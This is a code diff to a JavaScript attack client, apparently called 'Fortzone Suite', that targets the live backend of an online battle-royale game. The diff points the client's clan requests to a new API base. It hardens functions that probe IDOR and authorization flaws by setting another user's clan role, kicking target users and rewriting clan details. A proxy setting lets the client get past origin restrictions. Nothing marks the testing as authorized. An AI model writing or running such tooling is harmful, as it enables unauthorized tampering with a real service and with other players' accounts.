@@ -11,9 +11,11 @@ const DEFAULT_CONFIG = {
   proxyUrl: '', // e.g. 'https://corsproxy.io/?' or custom proxy
   battleApi: 'https://protondev.xyz:8511',
   nickApi: 'https://fahrenheit-dev.com/fz3/Nicks/ChangeNick',
+  clanApi: 'https://fahrenheit-dev.com/fz3',
   origin: 'https://fortzone-battle-royale-xkd.game-files.crazygames.com',
   versIdBattle: '9',
-  versIdNick: '10'
+  versIdNick: '10',
+  versIdClan: '10'
 };
 
 const RESERVED_NICKS = ['diva_killer', 'admin', 'system', 'root'];
@@ -34,6 +36,8 @@ function loadConfig() {
       CONFIG.proxyUrl = '/proxy?url=';
     }
   }
+  if (!CONFIG.clanApi) CONFIG.clanApi = DEFAULT_CONFIG.clanApi;
+  if (!CONFIG.versIdClan) CONFIG.versIdClan = DEFAULT_CONFIG.versIdClan;
 }
 
 function saveConfig() {
@@ -716,12 +720,30 @@ async function inspectMyClan(token) {
   appendLog('clanConsole', '🔍 Fetching clan details via /Clans/GetMyClan...', 'cyan');
   document.getElementById('clanStatus').textContent = 'Fetching...';
 
+  const clanBase = CONFIG.clanApi || 'https://fahrenheit-dev.com/fz3';
+  const versId = CONFIG.versIdClan || '10';
+
   try {
-    const resp = await fetchEndpoint(`${CONFIG.battleApi}/Clans/GetMyClan`, {
+    const resp = await fetchEndpoint(`${clanBase}/Clans/GetMyClan`, {
       method: 'POST',
-      body: `VersId=${CONFIG.versIdBattle}&token=${encodeURIComponent(normalizedToken)}`
+      body: `VersId=${versId}&token=${encodeURIComponent(normalizedToken)}`
     });
-    const data = await resp.json();
+
+    const text = (await resp.text()).trim();
+    if (!text) {
+      appendLog('clanConsole', `❌ Server returned HTTP ${resp.status} (Empty body).`, 'error');
+      document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
+      return;
+    }
+
+    let data;
+    try {
+      data = JSON.parse(text);
+    } catch (e) {
+      appendLog('clanConsole', `❌ Non-JSON response (HTTP ${resp.status}): ${text.slice(0, 120)}`, 'error');
+      document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
+      return;
+    }
 
     if (data.error !== 0 && data.ErrorCode && data.ErrorCode !== 0) {
       appendLog('clanConsole', `❌ GetMyClan failed: ${CLAN_ERRORS[data.ErrorCode] || data.ErrorCode}`, 'error');
@@ -730,7 +752,7 @@ async function inspectMyClan(token) {
     }
 
     const clan = data.value || data;
-    if (!clan || (!clan.Id && !clan.Name)) {
+    if (!clan || (!clan.Id && !clan.Name && !clan.Members)) {
       appendLog('clanConsole', `ℹ️ Response: ${JSON.stringify(data)}`, 'warn');
       appendLog('clanConsole', '⚠ No active clan found for this account (NotInClan).', 'warn');
       document.getElementById('clanStatus').textContent = 'Not in Clan';
@@ -761,7 +783,7 @@ async function inspectMyClan(token) {
       membersListEl.appendChild(div);
     });
 
-    appendLog('clanConsole', `✅ Clan "${clan.Name}" loaded. Total members: ${members.length}`, 'success');
+    appendLog('clanConsole', `✅ Clan "${clan.Name || clan.Id}" loaded. Total members: ${members.length}`, 'success');
     document.getElementById('clanStatus').textContent = 'Loaded';
   } catch (err) {
     appendLog('clanConsole', `❌ Network error inspecting clan: ${err.message}`, 'error');
@@ -778,17 +800,35 @@ async function probeClanSetRole(token, targetUserId, targetRole) {
   appendLog('clanConsole', `⚡ Probing IDOR: Setting User ${targetUserId} to Role ${targetRole} (${roleName})...`, 'cyan');
   document.getElementById('clanStatus').textContent = 'Probing...';
 
+  const clanBase = CONFIG.clanApi || 'https://fahrenheit-dev.com/fz3';
+  const versId = CONFIG.versIdClan || '10';
+
   const finishPayload = `data=${encodeURIComponent(JSON.stringify({
     UserId: Number(targetUserId),
     Role: Number(targetRole)
-  }))}&VersId=${CONFIG.versIdBattle}&token=${encodeURIComponent(normalizedToken)}`;
+  }))}&VersId=${versId}&token=${encodeURIComponent(normalizedToken)}`;
 
   try {
-    const resp = await fetchEndpoint(`${CONFIG.battleApi}/Clans/SetRole`, {
+    const resp = await fetchEndpoint(`${clanBase}/Clans/SetRole`, {
       method: 'POST',
       body: finishPayload
     });
-    const data = await resp.json();
+
+    const text = (await resp.text()).trim();
+    if (!text) {
+      appendLog('clanConsole', `❌ Server returned HTTP ${resp.status} (Empty body).`, 'error');
+      document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
+      return;
+    }
+
+    let data;
+    try {
+      data = JSON.parse(text);
+    } catch (e) {
+      appendLog('clanConsole', `❌ Non-JSON response (HTTP ${resp.status}): ${text.slice(0, 120)}`, 'error');
+      document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
+      return;
+    }
 
     const errCode = data.ErrorCode ?? data.error ?? 0;
     const errText = CLAN_ERRORS[errCode] || `Error ${errCode}`;
@@ -817,12 +857,31 @@ async function probeClanKick(token, targetUserId) {
   appendLog('clanConsole', `👢 Probing Kick authorization against User ${targetUserId}...`, 'cyan');
   document.getElementById('clanStatus').textContent = 'Probing Kick...';
 
+  const clanBase = CONFIG.clanApi || 'https://fahrenheit-dev.com/fz3';
+  const versId = CONFIG.versIdClan || '10';
+
   try {
-    const resp = await fetchEndpoint(`${CONFIG.battleApi}/Clans/Kick`, {
+    const resp = await fetchEndpoint(`${clanBase}/Clans/Kick`, {
       method: 'POST',
-      body: `targetUserId=${encodeURIComponent(targetUserId)}&VersId=${CONFIG.versIdBattle}&token=${encodeURIComponent(normalizedToken)}`
+      body: `targetUserId=${encodeURIComponent(targetUserId)}&VersId=${versId}&token=${encodeURIComponent(normalizedToken)}`
     });
-    const data = await resp.json();
+
+    const text = (await resp.text()).trim();
+    if (!text) {
+      appendLog('clanConsole', `❌ Server returned HTTP ${resp.status} (Empty body).`, 'error');
+      document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
+      return;
+    }
+
+    let data;
+    try {
+      data = JSON.parse(text);
+    } catch (e) {
+      appendLog('clanConsole', `❌ Non-JSON response (HTTP ${resp.status}): ${text.slice(0, 120)}`, 'error');
+      document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
+      return;
+    }
+
     const errCode = data.ErrorCode ?? data.error ?? 0;
     const errText = CLAN_ERRORS[errCode] || `Error ${errCode}`;
 
@@ -845,6 +904,9 @@ async function probeClanUpdate(token) {
   appendLog('clanConsole', '📝 Probing /Clans/Update permission...', 'cyan');
   document.getElementById('clanStatus').textContent = 'Probing Update...';
 
+  const clanBase = CONFIG.clanApi || 'https://fahrenheit-dev.com/fz3';
+  const versId = CONFIG.versIdClan || '10';
+
   const updateBody = {
     Description: 'Tested via Fortzone Suite',
     ImageId: 1,
@@ -853,11 +915,27 @@ async function probeClanUpdate(token) {
   };
 
   try {
-    const resp = await fetchEndpoint(`${CONFIG.battleApi}/Clans/Update`, {
+    const resp = await fetchEndpoint(`${clanBase}/Clans/Update`, {
       method: 'POST',
-      body: `data=${encodeURIComponent(JSON.stringify(updateBody))}&VersId=${CONFIG.versIdBattle}&token=${encodeURIComponent(normalizedToken)}`
+      body: `data=${encodeURIComponent(JSON.stringify(updateBody))}&VersId=${versId}&token=${encodeURIComponent(normalizedToken)}`
     });
-    const data = await resp.json();
+
+    const text = (await resp.text()).trim();
+    if (!text) {
+      appendLog('clanConsole', `❌ Server returned HTTP ${resp.status} (Empty body).`, 'error');
+      document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
+      return;
+    }
+
+    let data;
+    try {
+      data = JSON.parse(text);
+    } catch (e) {
+      appendLog('clanConsole', `❌ Non-JSON response (HTTP ${resp.status}): ${text.slice(0, 120)}`, 'error');
+      document.getElementById('clanStatus').textContent = `HTTP ${resp.status}`;
+      return;
+    }
+
     const errCode = data.ErrorCode ?? data.error ?? 0;
     const errText = CLAN_ERRORS[errCode] || `Error ${errCode}`;
 
@@ -1109,6 +1187,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('cfgProxy').value = CONFIG.proxyUrl;
     document.getElementById('cfgBattleApi').value = CONFIG.battleApi;
     document.getElementById('cfgNickApi').value = CONFIG.nickApi;
+    if (document.getElementById('cfgClanApi')) document.getElementById('cfgClanApi').value = CONFIG.clanApi;
     document.getElementById('cfgOrigin').value = CONFIG.origin;
     modalConfig.classList.remove('hidden');
   });
@@ -1119,6 +1198,7 @@ document.addEventListener('DOMContentLoaded', () => {
     CONFIG.proxyUrl = document.getElementById('cfgProxy').value.trim();
     CONFIG.battleApi = document.getElementById('cfgBattleApi').value.trim();
     CONFIG.nickApi = document.getElementById('cfgNickApi').value.trim();
+    if (document.getElementById('cfgClanApi')) CONFIG.clanApi = document.getElementById('cfgClanApi').value.trim();
     CONFIG.origin = document.getElementById('cfgOrigin').value.trim();
     saveConfig();
     modalConfig.classList.add('hidden');
@@ -1130,6 +1210,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('cfgProxy').value = CONFIG.proxyUrl;
     document.getElementById('cfgBattleApi').value = CONFIG.battleApi;
     document.getElementById('cfgNickApi').value = CONFIG.nickApi;
+    if (document.getElementById('cfgClanApi')) document.getElementById('cfgClanApi').value = CONFIG.clanApi;
     document.getElementById('cfgOrigin').value = CONFIG.origin;
     alert('Reset to defaults.');
   });
